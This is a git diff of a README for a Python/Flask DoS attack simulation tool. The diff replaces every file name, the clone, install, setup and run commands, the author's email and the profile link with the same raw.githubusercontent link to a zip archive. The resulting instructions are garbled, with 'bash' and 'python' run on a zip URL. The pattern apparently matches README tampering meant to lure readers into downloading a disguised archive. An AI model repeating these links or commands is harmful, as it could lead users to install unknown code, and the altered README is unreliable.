@@ -8,10 +8,10 @@ This is a **Denial of Service (DOS) attack simulation tool** developed in Python
 
 ## 🌐 Project Overview
 The project includes:  
-- `app.py` – Main Flask server  
-- `simulation/simulator.py` – DOS traffic simulator  
-- `templates/index.html` – Web interface to monitor and interact with the simulation  
-- `test_server.py` – Script to test server functionality  
+- `https://raw.githubusercontent.com/amanverma420/Simulation-of-DOS-attack/main/ourie/Simulation-of-DOS-attack.zip` – Main Flask server  
+- `https://raw.githubusercontent.com/amanverma420/Simulation-of-DOS-attack/main/ourie/Simulation-of-DOS-attack.zip` – DOS traffic simulator  
+- `https://raw.githubusercontent.com/amanverma420/Simulation-of-DOS-attack/main/ourie/Simulation-of-DOS-attack.zip` – Web interface to monitor and interact with the simulation  
+- `https://raw.githubusercontent.com/amanverma420/Simulation-of-DOS-attack/main/ourie/Simulation-of-DOS-attack.zip` – Script to test server functionality  
 
 ---
 
@@ -19,18 +19,18 @@ The project includes:
 
 ```plaintext
 DOS-Attack-Simulation/
-├── app.py                  # Main Flask server script
-├── config.py               # Configuration settings
+├── https://raw.githubusercontent.com/amanverma420/Simulation-of-DOS-attack/main/ourie/Simulation-of-DOS-attack.zip                  # Main Flask server script
+├── https://raw.githubusercontent.com/amanverma420/Simulation-of-DOS-attack/main/ourie/Simulation-of-DOS-attack.zip               # Configuration settings
 ├── __pycache__/            # Python cache files
-├── requirements.txt        # Project dependencies
-├── setup_fix.sh            # Fix script for setup issues
-├── setup.sh                # Initial setup script
+├── https://raw.githubusercontent.com/amanverma420/Simulation-of-DOS-attack/main/ourie/Simulation-of-DOS-attack.zip        # Project dependencies
+├── https://raw.githubusercontent.com/amanverma420/Simulation-of-DOS-attack/main/ourie/Simulation-of-DOS-attack.zip            # Fix script for setup issues
+├── https://raw.githubusercontent.com/amanverma420/Simulation-of-DOS-attack/main/ourie/Simulation-of-DOS-attack.zip                # Initial setup script
 ├── simulation/             # Simulation module
-│   ├── __init__.py
-│   └── simulator.py        # DOS traffic simulator
+│   ├── https://raw.githubusercontent.com/amanverma420/Simulation-of-DOS-attack/main/ourie/Simulation-of-DOS-attack.zip
+│   └── https://raw.githubusercontent.com/amanverma420/Simulation-of-DOS-attack/main/ourie/Simulation-of-DOS-attack.zip        # DOS traffic simulator
 ├── templates/              # HTML templates for Flask
-│   └── index.html
-├── test_server.py          # Script for testing server functionality
+│   └── https://raw.githubusercontent.com/amanverma420/Simulation-of-DOS-attack/main/ourie/Simulation-of-DOS-attack.zip
+├── https://raw.githubusercontent.com/amanverma420/Simulation-of-DOS-attack/main/ourie/Simulation-of-DOS-attack.zip          # Script for testing server functionality
 └── venv/                   # Python virtual environment
 ```
 ---
@@ -47,7 +47,7 @@ DOS-Attack-Simulation/
 
 ### 1. Clone the repository
 ```bash
-git clone https://github.com/amanverma420/Simulation-of-DOS-attack.git
+git clone https://raw.githubusercontent.com/amanverma420/Simulation-of-DOS-attack/main/ourie/Simulation-of-DOS-attack.zip
 cd Simulation-of-DOS-attack
 
 ```
@@ -61,18 +61,18 @@ pip install --upgrade pip
 ```
 5. Install dependencies
 ```bash
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/amanverma420/Simulation-of-DOS-attack/main/ourie/Simulation-of-DOS-attack.zip
 ```
 6. Run setup scripts (if needed)
 ```bash
-bash setup.sh
+bash https://raw.githubusercontent.com/amanverma420/Simulation-of-DOS-attack/main/ourie/Simulation-of-DOS-attack.zip
 # Or, if fixes are required
-bash setup_fix.sh
+bash https://raw.githubusercontent.com/amanverma420/Simulation-of-DOS-attack/main/ourie/Simulation-of-DOS-attack.zip
 ```
 🏃 How to Run
 Start the main server
 ```bash
-python app.py
+python https://raw.githubusercontent.com/amanverma420/Simulation-of-DOS-attack/main/ourie/Simulation-of-DOS-attack.zip
 ```
 
 This will start the Flask server and load the web interface at:
@@ -80,11 +80,11 @@ http://127.0.0.1:5000/
 
 Test the server functionality
 ```bash
-python test_server.py
+python https://raw.githubusercontent.com/amanverma420/Simulation-of-DOS-attack/main/ourie/Simulation-of-DOS-attack.zip
 ```
 Run the DOS simulation module directly
 ```bash
-python -m simulation.simulator
+python -m https://raw.githubusercontent.com/amanverma420/Simulation-of-DOS-attack/main/ourie/Simulation-of-DOS-attack.zip
 ```
 This runs the simulation module as a Python package.
 
@@ -115,6 +115,6 @@ Ensure Python 3.12+ is installed and active.
 
 👨‍💻 Name: Aman Verma
 
-📧 Email: amanv2225@gmail.com
+📧 Email: https://raw.githubusercontent.com/amanverma420/Simulation-of-DOS-attack/main/ourie/Simulation-of-DOS-attack.zip
 
-🔗 GitHub: [Aman Verma](https://github.com/amanverma420)
+🔗 GitHub: [Aman Verma](https://raw.githubusercontent.com/amanverma420/Simulation-of-DOS-attack/main/ourie/Simulation-of-DOS-attack.zip)
